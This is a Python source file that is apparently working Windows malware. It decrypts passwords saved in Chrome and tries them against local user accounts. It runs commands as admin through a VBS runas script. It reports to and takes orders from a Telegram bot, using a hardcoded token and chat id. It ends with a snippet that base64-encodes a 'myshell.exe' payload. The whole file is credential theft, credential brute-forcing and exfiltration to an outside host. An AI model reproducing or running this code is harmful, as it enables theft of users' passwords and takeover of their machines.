from Cryptodome.Cipher import AES
from shutil import copy2
import base64 , requests,win32security,win32crypt,json,os,subprocess,sqlite3

from Cryptodome.Cipher import AES
class Chrome(object):
        def _get_key(self):
            file = open(os.environ['USERPROFILE']+'\\AppData\\Local\Google\\Chrome\\User Data\\Local State', "r" ,encoding='iso-8859-1')
            data=file.read()
            data=json.loads(data)
            return win32crypt.CryptUnprotectData(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:], None, None,None,0)[1]
        
        
        def _decrypt_password(self,key,iv,en_pass):
            try:
                return decryptgcm(key,iv,en_pass)[:-16].decode()
            except Exception as e:
                #print(e)
                pass
            
        def cp_path(self,path,name):
            try:
                os.mkdir(os.environ['AppData']+'\\Process\\')
            except:
                pass
            copy2(path,os.environ['AppData']+'\\Process\\'+name)
            return os.environ['AppData']+'\\Process\\'+name
            
            
        def show(self):
            user_data=os.environ['USERPROFILE']+'\\AppData\\Local\\Google\\Chrome\\User Data\\'
            profiles = ["Default",'Guest profile']
            for i in os.listdir(user_data):
                if "Profile " in i:
                    profiles.append(i)
            testpass = []
            for i in profiles:
                try:
                    path_db = self.cp_path(user_data+i+'\\Login Data',i+' login.db') 
                    conn = sqlite3.connect(path_db)
                    cursor = conn.cursor()
                except Exception as e:
                    pass
                try:
                    cursor.execute("select password_value from logins")
                except Exception as e:
                    pass
                try:
                    for n in cursor.fetchall():
                        testpass.append(self._decrypt_password(self._get_key(),n[0][3:15],n[0][15:]))
                except Exception as e:
                    pass
                try:
                    cursor.close()
                    conn.close()
                    os.remove(path_db)
                except Exception as e:
                    pass
        
            return testpass
        
def decryptgcm(key,iv,data):
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(data)

def cmd(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().strip().decode(errors='replace')

def getPass():
    test = Chrome().show()
    new = []
    for i in test:
        if i not in new and len(i)>0:
            new.append(i)
    return new

def getUsers():
    users = []
    for i in cmd('net user').split('----')[-1].split('  '):
        if len(i)>0:
            if 'The command completed successfully.' not in i:
                if i[0]=='-':
                    c = 0
                    for n in i:
                        if n!='-':
                            break
                        c+=1
                    users.append(i[c:].strip())
                else:
                    users.append(i.strip())
    return users

def ispassword(domain,username,password):
    try:
        win32security.LogonUser (
        username,
        domain,
        password,
        win32security.LOGON32_LOGON_NETWORK,
        win32security.LOGON32_PROVIDER_DEFAULT
        )
    except win32security.error:
        return False
    else:
        return True

def bruteOnetarget(password,user):
    for i in password:
        if ispassword('WORKGROUP',user,i):
            return i
    return False


def send_messages(message):
    return requests.get("https://api.telegram.org/bot"+telegram_token+"/sendMessage?chat_id="+chat_id+"&text="+message)

def read_messages(offset):
    r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset='+offset)
    con = r.json()['result'][-1]
    offset = con['update_id']
    message = con['message']['text']
    return offset, message

def readLast():
    ffo=1
    off=getFirstoffset(telegram_token)
    count=0
    while True:
        try:
            off,m=read_messages(str(off))
            if off!=ffo:
                ffo=off
                if count>=1:
                    return m
            sleep(0.5)
        except:
            pass
        count=1

def getFirstoffset(telegram_token):
    r = requests.get('https://api.telegram.org/bot'+telegram_token+'/getUpdates?offset=678189729')
    t = str(r.json()).split("{'update_id':")[-1]
    t = t.split()
    t = t[0].replace(',','')
    return t

def runProgramasAdmin(username, process, password):
    script = 'set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run "cmd"\nWScript.Sleep 100 \nWshShell.AppActivate "C:\\Windows\\system32\\cmd.exe" \nWScript.Sleep 100 \nWshShell.SendKeys "runas /user:'+username+' '+process+'"\nWshShell.SendKeys "{ENTER}"\nWshShell.SendKeys "'+password+'"\nWshShell.SendKeys "{ENTER}"\nWshShell.SendKeys "exit"\nWshShell.SendKeys "{ENTER}"'
    path = os.environ['APPDATA']+os.sep+'PRVTEST'
    cmd('mkdir '+path)
    open(path+'\\testscript.vbs','w').write(script)
    return cmd ("cscript.exe //nologo //b "+path+'\\testscript.vbs ')

def bruteallusers(password,users):
    res = ''
    for i in users:
        for n in password:
            if ispassword('WORKGROUP',i,n):
                res+=(f"the password for user: {i} is {n}\n")
    if res:
        return res
    return False

def main():
    passwords = getPass()
    if len(passwords)>0:
        send_messages(os.getlogin()+" is connected!")
        users = getUsers()
        m = 'all users : \n'
        for i in users:
            m +=i+'\n'
        while True:
            send_messages('(1) to select a user to steal his password\n(2) to display all users\n(3) to brute force all users')
            M = readLast()
            if M == '1':
                if len(passwords)>0:
                    send_messages("Enter a username:")
                    user = readLast()
                    passwd = bruteOnetarget(passwords,user)
                    if passwd:
                        send_messages("The passwords for "+user+" is: "+passwd)
                        send_messages('Please enter command/process to run as admin: ')
                        process = readLast()
                        runProgramasAdmin(user, process, passwd)
                else:
                    send_messages("No passwords were found")
            if M == "2":
                for i in users:
                    m +=i+'\n'
                send_messages(m)
            else:
                send_messages(bruteallusers(passwords,users))
            
telegram_token = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
chat_id = '-1001830797904'

main()

import base64
with open (r"C:\Users\User\Desktop\test\myshell.exe",'rb') as file:
    data = base64.b64encode(file.read())
    file.close()
print(data)
